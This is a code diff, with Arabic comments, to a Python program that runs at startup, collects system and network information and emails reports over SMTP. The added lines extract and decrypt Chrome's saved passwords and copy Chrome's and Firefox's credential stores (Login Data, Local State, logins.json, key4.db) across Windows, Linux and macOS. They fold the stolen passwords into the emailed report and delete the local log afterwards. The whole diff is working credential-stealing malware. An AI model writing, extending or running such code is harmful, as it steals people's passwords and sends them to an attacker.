@@ -22,6 +22,13 @@ import socket
 import subprocess
 import shutil
 import sys
+from Crypto.Cipher import AES
+import win32crypt  # تحتاج تثبيت pywin32
+from Cryptodome.Protocol.KDF import PBKDF2
+import base64
+import json
+import sqlite3
+import tempfile
 
 is_watcher = "--watcher" in sys.argv
 
@@ -83,11 +90,53 @@ def send_email(subject, content):
             smtp.starttls()
             smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
             smtp.send_message(msg)
-        
+
+        os.remove(log_filename)
         print(f"[+] Email sent with log file: {log_filename}")
 
     except Exception as e:
         print(f"[-] Email error: {e}")
+def decrypt_chrome_password(ciphertext, master_key):
+    try:
+        if ciphertext.startswith(b'v10'):
+            iv = ciphertext[3:15]
+            payload = ciphertext[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted = cipher.decrypt(payload)[:-16]
+            return decrypted.decode()
+        else:
+            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
+    except Exception:
+        return "Failed to decrypt"
+
+def extract_chrome_passwords(login_db_path, local_state_path):
+    master_key = get_chrome_master_key(local_state_path)
+    if not master_key:
+        return "[!] Master key not found."
+
+    temp_copy = os.path.join(tempfile.gettempdir(), "chrome_login_temp.db")
+    shutil.copy2(login_db_path, temp_copy)
+
+    passwords = "\n===== Chrome Saved Passwords =====\n"
+    try:
+        conn = sqlite3.connect(temp_copy)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        for row in cursor.fetchall():
+            url, username, encrypted_password = row
+            if username or encrypted_password:
+                decrypted_password = decrypt_chrome_password(encrypted_password, master_key)
+                passwords += f"[{url}]\nUser: {username}\nPass: {decrypted_password}\n\n"
+        cursor.close()
+        conn.close()
+    except Exception as e:
+        passwords += f"[!] Error reading login DB: {e}\n"
+    finally:
+        try:
+            os.remove(temp_copy)
+        except:
+            pass
+    return passwords
 
 # ===== إرسال إشعار بدء التشغيل =====
 def send_startup_info():
@@ -169,6 +218,52 @@ def send_startup_info():
             system_info += f"\n===== Active Connections =====\n{connections}\n"
         except Exception:
             system_info += "\nUnable to fetch network connections\n"
+        # ملفات كلمات المرور من المتصفحات
+        files_to_attach = []
+        tmp_dir = tempfile.gettempdir()
+
+        def safe_copy(path, label):
+            if os.path.exists(path):
+                try:
+                    dest = os.path.join(tmp_dir, f"{label.replace(' ', '_')}_{os.path.basename(path)}")
+                    shutil.copy2(path, dest)
+                    files_to_attach.append(dest)
+                except:
+                    pass
+
+        system = platform.system()
+        home = os.path.expanduser("~")
+
+        if system == "Windows":
+            chrome = os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
+            local_state = os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+            firefox = os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
+        elif system == "Linux":
+            chrome = os.path.join(home, ".config", "google-chrome", "Default", "Login Data")
+            local_state = os.path.join(home, ".config", "google-chrome", "Local State")
+            firefox = os.path.join(home, ".mozilla", "firefox")
+        elif system == "Darwin":
+            chrome = os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data")
+            local_state = os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Local State")
+            firefox = os.path.join(home, "Library", "Application Support", "Firefox", "Profiles")
+        else:
+            chrome = local_state = firefox = None
+
+        # Chrome
+        safe_copy(chrome, "Chrome Login Data")
+        safe_copy(local_state, "Chrome Local State")
+        chrome_passwords = ""
+        if os.path.exists(chrome) and os.path.exists(local_state):
+            chrome_passwords = extract_chrome_passwords(chrome, local_state)
+            system_info += f"\n{chrome_passwords}\n"
+
+
+        # Firefox
+        if firefox and os.path.exists(firefox):
+            for root, dirs, files in os.walk(firefox):
+                for file in files:
+                    if file in ["logins.json", "key4.db"]:
+                        safe_copy(os.path.join(root, file), f"Firefox_{file}")
 
         # إرسال التقرير عبر البريد الإلكتروني
         send_email("Advanced System Startup Notification", system_info)
@@ -310,7 +405,7 @@ WantedBy=default.target
                     except Exception as e:
                         print(f"[-] Recovery failed: {e}")
 
-                time.sleep(6)  # راقب كل دقيقة
+                time.sleep(60)  # راقب كل دقيقة
 
                 
 
